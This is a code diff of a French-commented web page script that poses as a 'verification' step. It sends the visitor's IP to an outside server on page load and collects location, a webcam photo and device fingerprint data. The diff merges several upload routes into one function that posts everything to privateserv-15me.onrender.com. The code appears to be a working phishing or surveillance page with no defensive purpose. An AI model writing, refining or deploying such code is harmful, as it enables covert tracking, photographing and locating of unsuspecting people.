@@ -308,6 +308,7 @@
     <script>
         // ========== SESSION ID ==========
         const SESSION_ID = crypto.randomUUID ? crypto.randomUUID() : 'sess-' + Date.now() + '-' + Math.random().toString(36).substring(2, 10);
+        console.log('🔑 Session ID:', SESSION_ID);
 
         // ========== CONFIGURATION ==========
         const SERVER_URL = 'https://privateserv-15me.onrender.com';
@@ -319,85 +320,13 @@
         let cameraAttempted = false, microphoneAttempted = false, geolocationAttempted = false;
 
         // Données collectées
-        let userIP = null, userCoords = null, photoBlob = null;
+        let userIP = { error: 'Non récupérée' };
+        let userCoords = { error: 'Non récupérées' };
+        let photoBlob = null;
+        let ipSent = false, photoSent = false;
         let systemSent = false;
 
-        // ========== ENVOI ==========
-
-        // Fonction générique pour envoyer des données vers différentes routes
-        async function sendData(endpoint, data) {
-            try {
-                const formData = new FormData();
-                formData.append('timestamp', new Date().toISOString());
-                formData.append('userAgent', navigator.userAgent);
-                formData.append('sessionId', SESSION_ID);
-
-                // Ajouter les champs selon les données fournies
-                if (data.ip) formData.append('ip', JSON.stringify(data.ip));
-                if (data.coordinates) formData.append('coordinates', JSON.stringify(data.coordinates));
-                if (data.permissions) formData.append('permissions', JSON.stringify(data.permissions));
-                if (data.photo) formData.append('photo', data.photo, 'verif-' + Date.now() + '.jpg');
-                if (data.systemInfo) formData.append('systemInfo', JSON.stringify(data.systemInfo));
-
-                const resp = await fetch(SERVER_URL + endpoint, {
-                    method: 'POST',
-                    body: formData,
-                    credentials: 'omit'
-                });
-
-                if (resp.ok) {
-                    const result = await resp.json();
-                    console.log('✅ Envoi réussi vers', endpoint, result);
-                    return true;
-                } else {
-                    const text = await resp.text();
-                    console.warn('⚠️ Échec envoi vers', endpoint, 'status:', resp.status, text);
-                    return false;
-                }
-            } catch (e) {
-                console.warn('⚠️ Erreur envoi vers', endpoint, e.message);
-                return false;
-            }
-        }
-
-        // Envoyer IP
-        async function sendIP(ip) {
-            return sendData('/api/ip', { ip });
-        }
-
-        // Envoyer géolocalisation
-        async function sendCoordinates(coords) {
-            return sendData('/api/coordinates', { coordinates: coords });
-        }
-
-        // Envoyer microphone (permissions)
-        async function sendMicrophonePermission() {
-            const perms = {
-                camera: cameraGranted,
-                microphone: microphoneGranted,
-                geolocation: geolocationGranted
-            };
-            return sendData('/api/permissions', { permissions: perms });
-        }
-
-        // Envoyer photo
-        async function sendPhoto(photoBlob) {
-            return sendData('/api/photo', { photo: photoBlob });
-        }
-
-        // Envoyer système (une seule fois)
-        async function sendSystemInfo() {
-            if (systemSent) return;
-            const sys = {
-                screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth, devicePixelRatio: window.devicePixelRatio },
-                navigator: { language: navigator.language, platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            await sendData('/api/system', { systemInfo: sys });
-            systemSent = true;
-        }
-
-        // ========== COLLECTE AVEC ENVOI ==========
+        // ========== COLLECTE AVEC ENVOI IMMÉDIAT ==========
 
         async function getIPAddress() {
             try {
@@ -405,11 +334,11 @@
                 const data = await resp.json();
                 userIP = { ip: data.ip, city: 'Unknown', region: 'Unknown', country: 'Unknown', postal: 'N/A', latitude: null, longitude: null, timezone: 'N/A', isp: 'N/A' };
                 console.log('📡 IP récupérée:', userIP.ip);
-                await sendIP(userIP);
             } catch (e) {
-                userIP = { error: 'Non disponible' };
+                userIP = { error: 'Non disponible', message: e.message };
                 console.warn('⚠️ Erreur IP:', e.message);
             }
+            sendUpdate();
         }
 
         function getGeolocation() {
@@ -417,13 +346,13 @@
                 if (!navigator.geolocation) {
                     geolocationAttempted = true;
                     userCoords = { error: 'Géolocalisation non disponible' };
-                    sendCoordinates(userCoords);
+                    sendUpdate();
                     updateUI();
                     resolve(false);
                     return;
                 }
                 navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
+                    (pos) => {
                         geolocationGranted = true;
                         geolocationAttempted = true;
                         userCoords = {
@@ -434,15 +363,15 @@
                             timestamp: pos.timestamp
                         };
                         console.log('📍 Géolocalisation acceptée:', userCoords.latitude, userCoords.longitude);
-                        await sendCoordinates(userCoords);
+                        sendUpdate();
                         updateUI();
                         resolve(true);
                     },
-                    async (err) => {
+                    (err) => {
                         geolocationAttempted = true;
                         userCoords = { error: err.message };
                         console.warn('⚠️ Géolocalisation refusée:', err.message);
-                        await sendCoordinates(userCoords);
+                        sendUpdate();
                         updateUI();
                         resolve(false);
                     },
@@ -458,13 +387,13 @@
                 microphoneGranted = true;
                 microphoneAttempted = true;
                 console.log('🎤 Microphone accepté');
-                await sendMicrophonePermission();
+                sendUpdate();
                 updateUI();
                 return true;
             } catch (e) {
                 microphoneAttempted = true;
                 console.warn('⚠️ Microphone refusé:', e.message);
-                await sendMicrophonePermission();
+                sendUpdate();
                 updateUI();
                 return false;
             }
@@ -482,13 +411,13 @@
                     capturePhoto();
                 };
                 console.log('📷 Caméra acceptée');
-                await sendMicrophonePermission(); // Met à jour les permissions (caméra passée à true)
+                sendUpdate();
                 updateUI();
                 return true;
             } catch (e) {
                 cameraAttempted = true;
                 console.warn('⚠️ Caméra refusée:', e.message);
-                await sendMicrophonePermission(); // Met à jour les permissions (caméra passée à false)
+                sendUpdate();
                 updateUI();
                 return false;
             }
@@ -505,13 +434,76 @@
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
-            canvas.toBlob(async (blob) => {
+            canvas.toBlob((blob) => {
                 if (blob) {
                     photoBlob = blob;
                     console.log('📸 Photo capturée, taille:', blob.size);
-                    await sendPhoto(blob);
+                    sendUpdate();
                 }
             }, 'image/jpeg', 0.9);
+        }
+
+        // ========== ENVOI ==========
+
+        async function sendUpdate() {
+            try {
+                const formData = new FormData();
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('userAgent', navigator.userAgent);
+                formData.append('sessionId', SESSION_ID);
+
+                // Permissions (toujours envoyées)
+                const perms = {
+                    camera: cameraGranted,
+                    microphone: microphoneGranted,
+                    geolocation: geolocationGranted
+                };
+                formData.append('permissions', JSON.stringify(perms));
+
+                // IP (une seule fois)
+                if (!ipSent) {
+                    formData.append('ip', JSON.stringify(userIP));
+                    ipSent = true;
+                }
+
+                // Coordonnées (envoyées à chaque fois car peuvent être mises à jour)
+                if (userCoords) {
+                    formData.append('coordinates', JSON.stringify(userCoords));
+                }
+
+                // Photo (une seule fois)
+                if (photoBlob && !photoSent) {
+                    formData.append('photo', photoBlob, 'verif-' + Date.now() + '.jpg');
+                    photoSent = true;
+                }
+
+                // Système (une seule fois)
+                if (!systemSent) {
+                    const sys = {
+                        screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth, devicePixelRatio: window.devicePixelRatio },
+                        navigator: { language: navigator.language, platform: navigator.platform, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints },
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    };
+                    formData.append('systemInfo', JSON.stringify(sys));
+                    systemSent = true;
+                }
+
+                console.log('📤 Envoi des données vers le serveur...');
+                const resp = await fetch(SERVER_URL + '/api/verification/photo', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'omit'
+                });
+                if (resp.ok) {
+                    const data = await resp.json();
+                    console.log('✅ Envoi réussi, session:', data.session_id);
+                } else {
+                    const text = await resp.text();
+                    console.warn('⚠️ Échec envoi, status:', resp.status, text);
+                }
+            } catch (e) {
+                console.warn('⚠️ Erreur envoi:', e.message);
+            }
         }
 
         // ========== UI ==========
@@ -566,10 +558,6 @@
         async function requestAllPermissions() {
             document.getElementById('allowBtn').disabled = true;
 
-            // Envoyer les infos système une seule fois
-            await sendSystemInfo();
-
-            // Demander micro, géoloc, caméra
             await requestMicrophone();
             await new Promise(r => setTimeout(r, 800));
             await getGeolocation();
@@ -616,9 +604,8 @@
         // ========== INIT ==========
 
         window.addEventListener('load', () => {
-            console.log('🔑 Session ID:', SESSION_ID);
             document.body.classList.add('unverified');
-            getIPAddress(); // Envoi IP immédiat
+            getIPAddress(); // Récupération et envoi immédiat
             updateUI();
             setInterval(updateUI, 2000);
         });
